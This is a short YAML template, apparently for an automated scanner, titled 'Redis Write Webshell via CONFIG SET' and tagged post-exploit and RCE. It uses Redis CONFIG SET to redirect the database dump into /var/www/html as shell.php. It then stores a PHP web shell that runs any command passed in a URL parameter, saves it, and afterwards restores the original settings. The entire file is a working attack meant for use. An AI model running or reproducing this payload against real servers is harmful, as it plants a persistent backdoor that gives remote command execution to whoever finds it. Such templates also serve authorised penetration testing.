id: redis-write-webshell
service: [redis]
info:
  name: Redis Write Webshell via CONFIG SET
  severity: critical
  tags: redis,post-exploit,rce

services:
  - ops:
      - kv: "CONFIG GET dir"
        name: dir
      - kv: "CONFIG GET dbfilename"
        name: dbfilename
    extractors:
      - type: regex
        name: orig_dir
        internal: true
        part: dir
        regex: ['dir\s+(.+)']
        group: 1
      - type: regex
        name: orig_file
        internal: true
        part: dbfilename
        regex: ['dbfilename\s+(.+)']
        group: 1

  - ops:
      - kv: "CONFIG SET dir /var/www/html"
      - kv: "CONFIG SET dbfilename shell.php"
      - kv: 'SET x "<?php system($_GET[0]);?>"'
      - kv: "SAVE"
    matchers:
      - type: word
        words: ["OK"]

  - ops:
      - kv: "CONFIG SET dir {{orig_dir}}"
      - kv: "CONFIG SET dbfilename {{orig_file}}"
